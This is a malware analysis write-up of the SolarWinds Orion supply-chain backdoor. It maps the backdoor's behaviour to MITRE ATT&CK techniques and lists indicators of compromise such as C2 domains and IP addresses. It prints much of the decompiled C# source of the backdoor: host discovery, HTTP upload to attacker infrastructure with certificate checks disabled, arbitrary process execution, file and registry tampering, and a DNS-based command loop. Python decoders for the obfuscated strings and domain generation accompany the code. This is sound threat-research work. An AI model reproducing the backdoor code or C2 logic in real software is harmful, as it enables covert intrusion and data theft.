## Solarwinds Supply Chain Attack - T1195.001 Supply Chain Compromise
Adversaries gained access to numerous public and private organizations by trojanized SolarWinds Orion software applications updates **(This attack is large, bad and very concerning)**

<br /><br />
SolarWinds-Core-v2019.4.5220-Hotfix5.msp - md5 02af7cec58b9a5da1c542b5a32151ba1

![](https://raw.githubusercontent.com/qeeqbox/reports/main/solarwinds/files/md5file.png)

<br /><br />
SolarWinds-Core-v2019.4.5220-Hotfix5.msp - info

```
Name 		solarwinds-core-v2019.4.5220-hotfix5.msp
md5 		02af7cec58b9a5da1c542b5a32151ba1
sha1 		1b476f58ca366b54f34d714ffce3fd73cc30db1a
sha256 		d0d626deb3f9484e649294a8dfa814c5568f846d5aa02d4cdad5d041a29d5600
ssdeep 		3145728:yMbnCpAK7nuv7xYiq0bC4zheqeRHuCieBVZNP7WJOQeXt+9riYBaeIBjSxTusL:yMbCp7uf3GnqfCVrNPgLrW4GoxSG
size 		204.88MB
bytes 		214831104
mime 		application/vnd.ms-msi
extension 	application/octet-stream
Entropy 	7.9988851973414095 (Minimum: 0.0, Maximum: 8.0)
```
<br /><br />
SolarWinds-Core-v2019.4.5220-Hotfix5.msp - metadata

```
codepage 		0
title 			Update for SolarWinds Orion Core Services 2019.4 (Hotfix5)
subject 		Update for SolarWinds Orion Core Services 2019.4 (Hotfix5)
author 			SolarWinds Worldwide, LLC.
comments 		Update for SolarWinds Orion Core Services 2019.4 (Hotfix5)
template 		{079A74C5-95D0-446E-86F7-B8EAF0A29654}
last_saved_by 		:RTM.1;:#RTM.1
revision_number 	{8413ED57-01DD-48F7-B521-B6C5DE1A54DF}
create_time 		2020-03-24 10:56:48
last_saved_time 	2020-03-24 10:56:48
num_words 		5
creating_application 	Windows Installer XML Toolset (3.9.1208.0)
security 		4
```
<br /><br />
SolarWinds-Core-v2019.4.5220-Hotfix5.msp - extracted files

![](https://raw.githubusercontent.com/qeeqbox/reports/main/solarwinds/files/extracted.png)

<br /><br />
SolarWinds-Core-v2019.4.5220-Hotfix5.msp - extracted files md5

```
34e9e373b21e8d8f0051f8c88e10008d  BigintOverflowFix.sql
b03dcbc2ba9114b09c04ea24c9c63321  ClearOldDataFromDetailAndHourlyTables.sql
60222d9d1766ca72eb7aa2aa79b76fad  ConfigurationWizard.exe
79b811614f6e733192271ae8cee7db7e  ConfigurationWizard.exe.config
8f9360404210799ebae3731dfc5dd93d  Core_Linux_2019.4.5200.9083.apkg
a42d681ac61a4fa1d85f5812aaddd7a4  Core.Settings.json
5026956e672613583a1fa4853f792301  dbsetup_pretimeseriesorder.txt
a6a7552de53fb9011297fd8bec604d4e  Interop.NetFWTypeLib.dll
c96d6e4342ffe7bcaea1abd744f084fd  Interop.olelib.dll
39b3853848d7d01ff752c96e709dbae6  Interop.OrionSWScheduler8.dll
b93e78593460cdddefcc44d6e51c86ba  Interop.TaskScheduler.dll
c9799173b23ae28cfa58168ddc46e3fa  IS2.SolarWinds.Orion.Core.Common.dll
572f3ab5036cc50e6e245c1ef1d084d9  IS3.SolarWinds.Data.Providers.Orion.Containers.v3.dll
943d50919c7a8df571cd500e0a418a67  IS3.SolarWinds.Data.Providers.Orion.v3.dll
c9799173b23ae28cfa58168ddc46e3fa  IS3.SolarWinds.Orion.Core.Common.dll
be8fb541d3c916b4d91f59f331a62d41  ISv2.SolarWinds.Orion.Swis.PubSub.dll
be8fb541d3c916b4d91f59f331a62d41  ISv3.SolarWinds.Orion.Swis.PubSub.dll
2241d9333baa0b61b95efaf5c70144ea  NetPerfMon_WebSite.precompiled.zip
0b9c58cbcf1bb2476b149c43d071959e  NetPerfMon_WebSite.zip
b917980a6dad722a4970c7c326c6db9b  OrionCoreDatabaseScheme.dbConfig
7905e0abd29412f11bb37c02aa370cc3  OrionWeb.dll
423238911cb6be14866f815f7f234dca  Orion.xml
f4c561e087aaa20e676aca2f5dfe516a  PM_2019.4_Patch.zip
7392101b7b29b0d976db655cd6b08a18  SolarWinds.ConfigurationWizard.Plugin.Common.dll
6a2c2a4d0b3b79ffd115d7f7b6ce8a8c  SolarWinds.ConfigurationWizard.Plugin.Orion.dll
b5ab5b5a7c2e2421680f5f8b6ba86e84  SolarWinds.Database.TimeSeries.Contracts.dll
db61b8bcf5b44b790dd99f6a6c5eedd7  SolarWinds.Database.TimeSeries.dll
b12c00167341703faa428ec806ba9cc3  SolarWinds.Data.Entity.dll
b91ce2fa41029f6955bff20079468448  SolarWinds.Orion.Core.BusinessLayer.dll  <--malicious
510af37d73ab0378ec8c62c820536525  SolarWinds.Orion.Core.BusinessLayer.dll.config
73a207c34cdf8f63eb9ef5252aba7022  SolarWinds.Orion.Core.Collector.dll
c9799173b23ae28cfa58168ddc46e3fa  SolarWinds.Orion.Core.Common.dll
0943bf039fadeec49f48ea488ce0225c  SolarWinds.Orion.Core.Strings.dll
4010fef59f8aa41b476306095a6eb970  SolarWinds.Orion.Core.Strings.resources.dll.de.file
4f27bace92d5f0fd4122e90f405d736c  SolarWinds.Orion.Core.Strings.resources.dll.ja.file
be8fb541d3c916b4d91f59f331a62d41  SolarWinds.Orion.Swis.PubSub.dll
123878cf5bb61c095369bad5b72bc516  Solarwinds.Settings.dll
24c5cdcd69ed8466eda14e8ced59bdba  taskschd.dll
c1c201388736053e9a883867dd5aba79  Toolset_2019.4_Patch.zip
a56b277160c716b1454e8fa3a7322393  TruncateFirstAndLastPartitions.sql
```
<br /><br />
SolarWinds.Orion.Core.BusinessLayer.dll - info

```
Name 		solarwinds.orion.core.businesslayer.dll
md5 		b91ce2fa41029f6955bff20079468448
sha1 		76640508b1e7759e548771a5359eaed353bf1eec
sha256 		32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77
ssdeep 		12288:Zx7m/z9aEBzvnvLtYAi6uLlYQ69BBpIvF1tjpH7BKi+0A8vca9owQ:6aEBTvRBi6uL6dIvDtjpH9+0A8vca9oD
size 		987.34KB
bytes 		1011032
mime 		application/x-dosexec
extension 	application/x-msdos-program
Entropy 	5.582826996737918 (Minimum: 0.0, Maximum: 8.0)
```
<br /><br />
SolarWinds.Orion.Core.BusinessLayer.dll - signed - T1553.002 Code Signing

```
CommonName 		Solarwinds Worldwide, LLC
OrganizationalUnit 	None
Organization 		Solarwinds Worldwide, LLC
Locality 		Austin
StateOrProvinceName 	None
CountryName 		US
Start 			Jan 21 00:00:00 2020 GMT
Ends 			Jan 20 23:59:59 2023 GMT
SerialNumber 		21150566861557194870231784728595120365
SerialNumberMD5 	08e35543d6110ed11fdf558bb093d401
```
<br /><br />
SolarWinds.Orion.Core.BusinessLayer.dll - metadata

![](https://raw.githubusercontent.com/qeeqbox/reports/main/solarwinds/files/businesslayermeta.png)

<br /><br />
SolarWinds.Orion.Core.BusinessLayer.dll - function - T1587.001 Develop Capabilities: Malware

![](https://raw.githubusercontent.com/qeeqbox/reports/main/solarwinds/files/function.png)

<br /><br />
SolarWinds.Orion.Core.BusinessLayer.dll - variables - T1027 Obfuscated Files or Information

![](https://raw.githubusercontent.com/qeeqbox/reports/main/solarwinds/files/vars.png)

<br /><br />
SolarWinds.Orion.Core.BusinessLayer.dll - Pyhton Decoder (base64 + zlib)

```
from base64 import b64decode
from zlib import decompress

def decode(string):
    return decompress(b64decode(string),-15)

for x in ['SywrLstNzskvTdFLzs8FAA==','SywoKK7MS9ZNLMgEAA==','Sy3VLU8tLtE1BAA=','Ky3WLU8tLtE1AgA=','Ky3WTU0sLtE1BAA=','Ky3WTU0sLtE1AgA=']:
	print(x," -> ", decode(x).decode('utf-8'))
```
```
SywrLstNzskvTdFLzs8FAA==  ->  avsvmcloud.com
SywoKK7MS9ZNLMgEAA==  ->  appsync-api
Sy3VLU8tLtE1BAA=  ->  eu-west-1
Ky3WLU8tLtE1AgA=  ->  us-west-2
Ky3WTU0sLtE1BAA=  ->  us-east-1
Ky3WTU0sLtE1AgA=  ->  us-east-2
```
<br /><br />
SolarWinds.Orion.Core.BusinessLayer.dll - c2 - TA0011 Command and Control

![](https://raw.githubusercontent.com/qeeqbox/reports/main/solarwinds/files/c2.png)

<br /><br />
SolarWinds.Orion.Core.BusinessLayer.dll - c2 structure

```csharp
private enum JobEngine
{
	Idle,
	Exit,
	SetTime,
	CollectSystemDescription,
	UploadSystemDescription,
	RunTask,
	GetProcessByDescription,
	KillTask,
	GetFileSystemEntries,
	WriteFile,
	FileExists,
	DeleteFile,
	GetFileHash,
	ReadRegistryValue,
	SetRegistryValue,
	DeleteRegistryValue,
	GetRegistrySubKeyAndValueNames,
	Reboot,
	None
}
```
<br /><br />
Set delay for http helper - T1587.001 Virtualization/Sandbox Evasion

```csharp
public static void SetTime(string[] args, out int delay)
{
	delay = int.Parse(args[0]);
}
```
<br /><br />
Get host info - T1082 System Information Discovery & T1016 System Network Configuration Discovery

```csharp
public static void CollectSystemDescription(string info, out string result)
{
	result = null;
	int num = 0;
	string domainName = IPGlobalProperties.GetIPGlobalProperties().DomainName;
	result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + domainName;
	try
	{
		string str = ((SecurityIdentifier)new NTAccount(domainName, OrionImprovementBusinessLayer.ZipHelper.Unzip("c0zJzczLLC4pSizJLwIA")).Translate(typeof(SecurityIdentifier))).AccountDomainSid.ToString();
		result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + str;
	}
	catch
	{
		result += OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num);
	}
	result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + IPGlobalProperties.GetIPGlobalProperties().HostName;
	result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + Environment.UserName;
	result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + OrionImprovementBusinessLayer.GetOSVersion(true);
	result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + Environment.SystemDirectory;
	result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + (int)TimeSpan.FromMilliseconds(Environment.TickCount).TotalDays;
	result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + info + "\n";
	result += OrionImprovementBusinessLayer.GetNetworkAdapterConfiguration();
}
```
<br /><br />
Perform http request - T1071.001 Web Protocols

```csharp
public static void UploadSystemDescription(string[] args, out string result, IWebProxy proxy)
{
	result = null;
	string requestUriString = args[0];
	string s = args[1];
	string text = (args.Length >= 3) ? args[2] : null;
	string[] array = Encoding.UTF8.GetString(Convert.FromBase64String(s)).Split(new string[]
	{
		"\r\n",
		"\r",
		"\n"
	}, StringSplitOptions.None);
	HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
	HttpWebRequest httpWebRequest2 = httpWebRequest;
	httpWebRequest2.ServerCertificateValidationCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpWebRequest2.ServerCertificateValidationCallback, new RemoteCertificateValidationCallback((object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors sslPolicyErrors) => true));
	httpWebRequest.Proxy = proxy;
	httpWebRequest.Timeout = 120000;
	httpWebRequest.Method = array[0].Split(new char[]
	{
		' '
	})[0];
	foreach (string text2 in array)
	{
		int num = text2.IndexOf(':');
		if (num > 0)
		{
			string text3 = text2.Substring(0, num);
			string text4 = text2.Substring(num + 1).TrimStart(Array.Empty<char>());
			if (!WebHeaderCollection.IsRestricted(text3))
			{
				httpWebRequest.Headers.Add(text2);
			}
			else
			{
				ulong hash = OrionImprovementBusinessLayer.GetHash(text3.ToLower());
				if (hash <= 8873858923435176895UL)
				{
					if (hash <= 6116246686670134098UL)
					{
						if (hash != 2734787258623754862UL)
						{
							if (hash == 6116246686670134098UL)
							{
								httpWebRequest.ContentType = text4;
							}
						}
						else
						{
							httpWebRequest.Accept = text4;
						}
					}
					else if (hash != 7574774749059321801UL)
					{
						if (hash == 8873858923435176895UL)
						{
							if (OrionImprovementBusinessLayer.GetHash(text4.ToLower()) == 1475579823244607677UL)
							{
								httpWebRequest.ServicePoint.Expect100Continue = true;
							}
							else
							{
								httpWebRequest.Expect = text4;
							}
						}
					}
					else
					{
						httpWebRequest.UserAgent = text4;
					}
				}
				else if (hash <= 11266044540366291518UL)
				{
					if (hash != 9007106680104765185UL)
					{
						if (hash == 11266044540366291518UL)
						{
							ulong hash2 = OrionImprovementBusinessLayer.GetHash(text4.ToLower());
							httpWebRequest.KeepAlive = (hash2 == 13852439084267373191UL || httpWebRequest.KeepAlive);
							httpWebRequest.KeepAlive = (hash2 != 14226582801651130532UL && httpWebRequest.KeepAlive);
						}
					}
					else
					{
						httpWebRequest.Referer = text4;
					}
				}
				else if (hash != 15514036435533858158UL)
				{
					if (hash == 16066522799090129502UL)
					{
						httpWebRequest.Date = DateTime.Parse(text4);
					}
				}
				else
				{
					httpWebRequest.Date = DateTime.Parse(text4);
				}
			}
		}
	}
	result += string.Format(OrionImprovementBusinessLayer.ZipHelper.Unzip("qzaoVag2rFXwCAkJ0K82quUCAA=="), httpWebRequest.Method, httpWebRequest.Address.PathAndQuery, httpWebRequest.ProtocolVersion.ToString());
	result = result + httpWebRequest.Headers.ToString() + "\n\n";
	if (!string.IsNullOrEmpty(text))
	{
		using (Stream requestStream = httpWebRequest.GetRequestStream())
		{
			byte[] array3 = Convert.FromBase64String(text);
			requestStream.Write(array3, 0, array3.Length);
		}
	}
	using (WebResponse response = httpWebRequest.GetResponse())
	{
		result += string.Format("{0} {1}\n", (int)((HttpWebResponse)response).StatusCode, ((HttpWebResponse)response).StatusDescription);
		result = result + response.Headers.ToString() + "\n";
		using (Stream responseStream = response.GetResponseStream())
		{
			result += new StreamReader(responseStream).ReadToEnd();
		}
	}
}
```
<br /><br />
UploadSystemDescription - Python fnv 64 hash logic
```python
def encrypt_fnv_64(string):
    hval = 14695981039346656037
    for letter in string:
        hval = hval ^ ord(letter)
        hval = (hval * 1099511628211) % (2 ** 64)
    return hval ^ 6605813339339102567
```

```
7574774749059321801  	->  user-agent
9007106680104765185  	->  referer
6116246686670134098  	->  content-type
16066522799090129502  	->  date
14226582801651130532  	->  close
2734787258623754862  	->  accept
11266044540366291518  	->  connection
8873858923435176895  	->  expect
13852439084267373191  	->  keep-alive
1475579823244607677  	->  100-continue
```

<br /><br />
Start a process -  T1569.002 Service Execution & T1543.003 Create or Modify System Process 

```csharp
public static int RunTask(string[] args, string cl, out string result)
{
	result = null;
	string fileName = Environment.ExpandEnvironmentVariables(args[0]);
	string arguments = (args.Length > 1) ? cl.Substring(OrionImprovementBusinessLayer.Job.GetArgumentIndex(cl, 1)).Trim() : null;
	using (Process process = new Process())
	{
		process.StartInfo = new ProcessStartInfo(fileName, arguments)
		{
			CreateNoWindow = false,
			UseShellExecute = false
		};
		if (process.Start())
		{
			result = process.Id.ToString();
			return 0;
		}
	}
	return 1;
}

```
<br /><br />
Get processes info - T1057 Process Discovery

```csharp
public static void GetProcessByDescription(string[] args, out string result)
{
	result = null;
	if (args.Length == 0)
	{
		foreach (Process process in Process.GetProcesses())
		{
			result += string.Format(OrionImprovementBusinessLayer.ZipHelper.Unzip("i6420DGtjVWoNqzlAgA="), process.Id, OrionImprovementBusinessLayer.Quote(process.ProcessName));
		}
		return;
	}
	using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(OrionImprovementBusinessLayer.ZipHelper.Unzip("C07NSU0uUdBScCvKz1UIz8wzNooPKMpPTi0uBgA=")))
	{
		foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
		{
			ManagementObject managementObject = (ManagementObject)managementBaseObject;
			string[] array = new string[]
			{
				string.Empty,
				string.Empty
			};
			ManagementObject managementObject2 = managementObject;
			string methodName = OrionImprovementBusinessLayer.ZipHelper.Unzip("c08t8S/PSy0CAA==");
			object[] array2 = array;
			object[] args2 = array2;
			Convert.ToInt32(managementObject2.InvokeMethod(methodName, args2));
			result += string.Format(OrionImprovementBusinessLayer.ZipHelper.Unzip("i6420DGtjVWoNtTRNTSrVag2quWsNgYKKVSb1MZUm9ZyAQA="), new object[]
			{
				managementObject[OrionImprovementBusinessLayer.ZipHelper.Unzip("CyjKT04tLvZ0AQA=")],
				OrionImprovementBusinessLayer.Quote(managementObject[OrionImprovementBusinessLayer.ZipHelper.Unzip("80vMTQUA")].ToString()),
				managementObject[args[0]],
				managementObject[OrionImprovementBusinessLayer.ZipHelper.Unzip("C0gsSs0rCSjKT04tLvZ0AQA=")],
				array[1],
				array[0]
			});
		}
	}
}
```
<br /><br />
Kill a task by PID - T1489 Service Stop & T1543.003 Create or Modify System Process

```csharp
public static void KillTask(string[] args)
{
	Process.GetProcessById(int.Parse(args[0])).Kill();
}
```
<br /><br />
Get files and folders by path - T1083 File and Directory Discovery

```csharp
public static void GetFileSystemEntries(string[] args, out string result)
{
	string searchPattern = (args.Length >= 2) ? args[1] : "*";
	string path = Environment.ExpandEnvironmentVariables(args[0]);
	string[] value = (from f in Directory.GetFiles(path, searchPattern)
	select Path.GetFileName(f)).ToArray<string>();
	string[] value2 = (from f in Directory.GetDirectories(path, searchPattern)
	select Path.GetFileName(f)).ToArray<string>();
	result = string.Join("\n", value2) + "\n\n" + string.Join(" \n", value);
}
```
<br /><br />
Write to file - T1105 Ingress Tool Transfer

```csharp
public static void WriteFile(string[] args)
{
	string path = Environment.ExpandEnvironmentVariables(args[0]);
	byte[] array = Convert.FromBase64String(args[1]);
	for (int i = 0; i < 3; i++)
	{
		try
		{
			using (FileStream fileStream = new FileStream(path, FileMode.Append, FileAccess.Write))
			{
				fileStream.Write(array, 0, array.Length);
			}
			break;
		}
		catch (Exception)
		{
			if (i + 1 >= 3)
			{
				throw;
			}
		}
		OrionImprovementBusinessLayer.DelayMs(0.0, 0.0);
	}
}

```
<br /><br />
Check if file exists - T1083 File and Directory Discovery

```csharp
public static void FileExists(string[] args, out string result)
{
	string path = Environment.ExpandEnvironmentVariables(args[0]);
	result = File.Exists(path).ToString();
}

```
<br /><br />
Delete file by path - T1070.004 File Deletion

```csharp
public static void DeleteFile(string[] args)
{
	File.Delete(Environment.ExpandEnvironmentVariables(args[0]));
}
```
<br /><br />
Get a registry value - T1012 Query Registry

```csharp
public static int ReadRegistryValue(string[] args, out string result)
{
	result = OrionImprovementBusinessLayer.RegistryHelper.GetValue(args[0], args[1], null);
	if (result != null)
	{
		return 0;
	}
	return 1;
}
```
<br /><br />
Modfiy a registry value - T1112 Modify Registry

```csharp
public static int SetRegistryValue(string[] args)
{
	RegistryValueKind valueKind = (RegistryValueKind)Enum.Parse(typeof(RegistryValueKind), args[2]);
	string valueData = (args.Length > 3) ? Encoding.UTF8.GetString(Convert.FromBase64String(args[3])) : "";
	if (!OrionImprovementBusinessLayer.RegistryHelper.SetValue(args[0], args[1], valueData, valueKind))
	{
		return 1;
	}
	return 0;
}
```
<br /><br />
Delete a registry value - T1112 Modify Registry

```csharp
public static void DeleteRegistryValue(string[] args)
{
	OrionImprovementBusinessLayer.RegistryHelper.DeleteValue(args[0], args[1]);
}
```
<br /><br />
Get all registry keys and values - T1012 Query Registry

```csharp
public static void GetRegistrySubKeyAndValueNames(string[] args, out string result)
{
	result = OrionImprovementBusinessLayer.RegistryHelper.GetSubKeyAndValueNames(args[0]);
}
```
<br /><br />
Update - T1568.002 Domain Generation Algorithms & T1071.004 Application Layer Protocol: DNS

```csharp
private static void Update()
{
	bool flag = false;
	OrionImprovementBusinessLayer.CryptoHelper cryptoHelper = new OrionImprovementBusinessLayer.CryptoHelper(OrionImprovementBusinessLayer.userId, OrionImprovementBusinessLayer.domain4);
	OrionImprovementBusinessLayer.HttpHelper httpHelper = null;
	Thread thread = null;
	bool flag2 = true;
	OrionImprovementBusinessLayer.AddressFamilyEx addressFamilyEx = OrionImprovementBusinessLayer.AddressFamilyEx.Unknown;
	int num = 0;
	bool flag3 = true;
	OrionImprovementBusinessLayer.DnsRecords dnsRecords = new OrionImprovementBusinessLayer.DnsRecords();
	Random random = new Random();
	int a = 0;
	if (!OrionImprovementBusinessLayer.UpdateNotification())
	{
		return;
	}
	OrionImprovementBusinessLayer.svcListModified2 = false;
	int num2 = 1;
	while (num2 <= 3 && !flag)
	{
		OrionImprovementBusinessLayer.DelayMin(dnsRecords.A, dnsRecords.A);
		if (!OrionImprovementBusinessLayer.ProcessTracker.TrackProcesses(true))
		{
			if (OrionImprovementBusinessLayer.svcListModified1)
			{
				flag3 = true;
			}
			num = (OrionImprovementBusinessLayer.svcListModified2 ? (num + 1) : 0);
			string hostName;
			if (OrionImprovementBusinessLayer.status == OrionImprovementBusinessLayer.ReportStatus.New)
			{
				hostName = ((addressFamilyEx == OrionImprovementBusinessLayer.AddressFamilyEx.Error) ? cryptoHelper.GetCurrentString() : cryptoHelper.GetPreviousString(out flag2));
			}
			else
			{
				if (OrionImprovementBusinessLayer.status != OrionImprovementBusinessLayer.ReportStatus.Append)
				{
					break;
				}
				hostName = (flag3 ? cryptoHelper.GetNextStringEx(dnsRecords.dnssec) : cryptoHelper.GetNextString(dnsRecords.dnssec));
			}
			addressFamilyEx = OrionImprovementBusinessLayer.DnsHelper.GetAddressFamily(hostName, dnsRecords);
			switch (addressFamilyEx)
			{
			case OrionImprovementBusinessLayer.AddressFamilyEx.NetBios:
				if (OrionImprovementBusinessLayer.status == OrionImprovementBusinessLayer.ReportStatus.Append)
				{
					flag3 = false;
					if (dnsRecords.dnssec)
					{
						a = dnsRecords.A;
						dnsRecords.A = random.Next(1, 3);
					}
				}
				if (OrionImprovementBusinessLayer.status == OrionImprovementBusinessLayer.ReportStatus.New && flag2)
				{
					OrionImprovementBusinessLayer.status = OrionImprovementBusinessLayer.ReportStatus.Append;
					OrionImprovementBusinessLayer.ConfigManager.WriteReportStatus(OrionImprovementBusinessLayer.status);
				}
				if (!string.IsNullOrEmpty(dnsRecords.cname))
				{
					dnsRecords.A = a;
					OrionImprovementBusinessLayer.HttpHelper.Close(httpHelper, thread);
					httpHelper = new OrionImprovementBusinessLayer.HttpHelper(OrionImprovementBusinessLayer.userId, dnsRecords);
					if (!OrionImprovementBusinessLayer.svcListModified2 || num > 1)
					{
						OrionImprovementBusinessLayer.svcListModified2 = false;
						thread = new Thread(new ThreadStart(httpHelper.Initialize))
						{
							IsBackground = true
						};
						thread.Start();
					}
				}
				num2 = 0;
				break;
			case OrionImprovementBusinessLayer.AddressFamilyEx.ImpLink:
			case OrionImprovementBusinessLayer.AddressFamilyEx.Atm:
				OrionImprovementBusinessLayer.ConfigManager.WriteReportStatus(OrionImprovementBusinessLayer.ReportStatus.Truncate);
				OrionImprovementBusinessLayer.ProcessTracker.SetAutomaticMode();
				flag = true;
				break;
			case OrionImprovementBusinessLayer.AddressFamilyEx.Ipx:
				if (OrionImprovementBusinessLayer.status == OrionImprovementBusinessLayer.ReportStatus.Append)
				{
					OrionImprovementBusinessLayer.ConfigManager.WriteReportStatus(OrionImprovementBusinessLayer.ReportStatus.New);
				}
				flag = true;
				break;
			case OrionImprovementBusinessLayer.AddressFamilyEx.InterNetwork:
			case OrionImprovementBusinessLayer.AddressFamilyEx.InterNetworkV6:
			case OrionImprovementBusinessLayer.AddressFamilyEx.Unknown:
				goto IL_1F7;
			case OrionImprovementBusinessLayer.AddressFamilyEx.Error:
				dnsRecords.A = random.Next(420, 540);
				break;
			default:
				goto IL_1F7;
			}
			IL_1F9:
			num2++;
			continue;
			IL_1F7:
			flag = true;
			goto IL_1F9;
		}
		break;
	}
	OrionImprovementBusinessLayer.HttpHelper.Close(httpHelper, thread);
}
```

<br /><br />
Decrypt DGA python script
```python
def decrypt_string(s):
	try:
		secert = list("rq3gsalt6u1iyfzop572d49bnx8cvmkewhj")
		secert_ext = "0_-."
		secert_len = len(secert)
		result = ""
		i = 0
		while i < (len(s)):
			if s[i] != '0':
				result += secert[(secert.index(s[i]) + secert_len - 4) % secert_len];
			else:
				result += secert_ext[secert.index(s[i + 1]) % 4]
				i+=1
			i+=1
		return result
	except:
		return "Error"
```

## Domain Lookup
```
Registered: July 25, 2018  [2 years old]
Updated: October 08, 2020  [2 months ago]
Expiry: July 25, 2023  [2 years left]
```

## IoCs

```
02af7cec58b9a5da1c542b5a32151ba1
b91ce2fa41029f6955bff20079468448
08e35543d6110ed11fdf558bb093d401
2c4a910a1299cdae2a4e55988a2f102e
846e27a652a5e1bfbd0ddd38a16dc865
4f2eb62fa529c0283b28d05ddd311fae
56ceb6d0011d87b6e4d7023d7ef85676
```

```
avsvmcloud[.]com
.appsync-api.eu-west-1.avsvmcloud[.]com
.appsync-api.eu-west-1.avsvmcloud[.]com 
.appsync-api.eu-west-1.avsvmcloud[.]com
.appsync-api.us-west-2.avsvmcloud[.]com
.appsync-api.us-west-2.avsvmcloud[.]com
.appsync-api.us-east-2.avsvmcloud[.]com
freescanonline[.]com
deftsecurity[.]com
thedoccloud[.]com
incomeupdate[.]com
websitetheme[.]com
zupertech[.]com
highdatabase[.]com
panhardware[.]com
databasegalore[.]com
```

```
5.252.177.25
5.252.177.21
204.188.205.176
51.89.125.18
167.114.213.199
```

## All encrypted string
```
C07NSU0uUdBScCvKz1UIz8wzNor3Sy0pzy/KdkxJLChJLXLOz0vLTC8tSizJzM9TKM9ILUpV8AxwzUtMyklNsS0pKk0FAA==  ->  Select * From Win32_NetworkAdapterConfiguration where IPEnabled=true
c0ktTi7KLCjJzM8DAA==  ->  Description
83V0dkxJKUotLgYA  ->  MACAddress
c/FwDnDNS0zKSU0BAA==  ->  DHCPEnabled
c/FwDghOLSpLLQIA  ->  DHCPServer
c/EL9sgvLvFLzE0FAA==  ->  DNSHostName
c/ELdsnPTczMCy5NS8usCE5NLErO8C9KSS0CAA==  ->  DNSDomainSuffixSearchOrder
c/ELDk4tKkstCk5NLErO8C9KSS0CAA==  ->  DNSServerSearchOrder
8wxwTEkpSi0uBgA=  ->  IPAddress
8wwILk3KSy0BAA==  ->  IPSubnet
c0lNSyzNKfEMcE8sSS1PrAQA  ->  DefaultIPGateway
C07NSU0uUdBScCvKz1UIz8wzNor3L0gtSizJzEsPriwuSc0FAA==  ->  Select * From Win32_OperatingSystem
c04sKMnMzwMA  ->  Caption
8w92LErOyCxJTS4pLUoFAA==  ->  OSArchitecture
88wrLknMyXFJLEkFAA==  ->  InstallDate
8y9KT8zLrEosyczPAwA=  ->  Organization
C0pNzywuSS1KTQktTi0CAA==  ->  RegisteredUser
C0stKs7MzwMA  ->  Version
i3aNVag2qFWoNgRio1oA  ->  [E] {0} {1} {2}
8/B2jYz38Xd29In3dXT28PRzjQn2dwsJdwxyjfHNTC7KL85PK4lxLqosKMlPL0osyKgEAA==  ->  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography
801MzsjMS3UvzUwBAA==  ->  MachineGuid
MzTQA0MA  ->  10.0.0.0
MzI11TMAQQA=  ->  255.0.0.0
MzQ30jM00zPQMwAA  ->  172.16.0.0
MzI11TMyMdADQgA=  ->  255.240.0.0
M7Q00jM0s9Az0DMAAA==  ->  192.168.0.0
MzI11TMCYgM9AwA=  ->  255.255.0.0
MzIy0TMAQQA=  ->  224.0.0.0
MzIx0ANDAA==  ->  240.0.0.0
S0s2MLCyAgA=  ->  fc00::
S0s1MLCyAgA=  ->  fe00::
S0tNNrCyAgA=  ->  fec0::
S0tLNrCyAgA=  ->  ffc0::
S0szMLCyAgA=  ->  ff00::
S0szMLCyAgA=  ->  ff00::
MzHUszDRMzS11DMAAA==  ->  41.84.159.0
MzI11TOCYgMA  ->  255.255.255.0
MzfRMzQ00TMy0TMAAA==  ->  74.114.24.0
MzI11TMCYRMLPQMA  ->  255.255.248.0
MzQ10TM0tNAzNDHQMwAA  ->  154.118.140.0
MzI11TOCYgMA  ->  255.255.255.0
MzI01zM0M9Yz1zMAAA==  ->  217.163.7.0
MzI11TOCYgMA  ->  255.255.255.0
MzLQMzQx0ANCAA==  ->  20.140.0.0
MzI11TMyNdEz0DMAAA==  ->  255.254.0.0
szTTMzbUMzQ30jMAAA==  ->  96.31.172.0
MzI11TOCYgMA  ->  255.255.255.0
MzQ21DMystAzNNIzAAA=  ->  131.228.12.0
MzI11TMCYyM9AwA=  ->  255.255.252.0
MzQx0bMw0zMyMtMzAAA=  ->  144.86.226.0
MzI11TOCYgMA  ->  255.255.255.0
s9AztNAzNDHRMwAA  ->  8.18.144.0
MzI11TMCYxM9AwA=  ->  255.255.254.0
M7TQMzQ20ANCAA==  ->  18.130.0.0
MzI11TMCYgM9AwA=  ->  255.255.0.0
MzfUMzQ10jM11jMAAA==  ->  71.152.53.0
MzI11TOCYgMA  ->  255.255.255.0
s7TUM7fUM9AzAAA=  ->  99.79.0.0
MzI11TMCYgM9AwA=  ->  255.255.0.0
szDXMzK20LMw0DMAAA==  ->  87.238.80.0
MzI11TMCYRMLPQMA  ->  255.255.248.0
M7S01DMyMNQzNDTXMwAA  ->  199.201.117.0
MzI11TOCYgMA  ->  255.255.255.0
M7Qw0TM30jPQMwAA  ->  184.72.0.0
MzI11TMyNdEz0DMAAA==  ->  255.254.0.0
07DP1NSIjkvUrYqtidPUKEktLoHzVTQB  ->  (?i)([^a-z]|^)(test)([^a-z]|$)
07DP1NQozs9JLCrPzEsp1gQA  ->  (?i)(solarwinds)
C0otyC8qCU8sSc5ILQpKLSmqBAA=  ->  ReportWatcherRetry
C0otyC8qCU8sSc5ILQrILy4pyM9LBQA=  ->  ReportWatcherPostpone
SyzI1CvOz0ksKs/MSynWS87PBQA=  ->  api.solarwinds.com
SywrLstNzskvTdFLzs8FAA==  ->  avsvmcloud.com
SywoKK7MS9ZNLMgEAA==  ->  appsync-api
Sy3VLU8tLtE1BAA=  ->  eu-west-1
Ky3WLU8tLtE1AgA=  ->  us-west-2
Ky3WTU0sLtE1BAA=  ->  us-east-1
